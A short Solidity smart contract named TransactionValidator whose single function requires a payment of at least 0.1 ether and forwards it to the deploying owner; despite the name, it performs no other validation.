// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TransactionValidator {
    address payable public owner;

    constructor() {
        owner = payable(msg.sender);
    }

    function validateTransaction() public payable {
        require(msg.value >= 0.1 ether, "Insufficient funds sent!");
        owner.transfer(msg.value); // Send funds to owner
    }
}
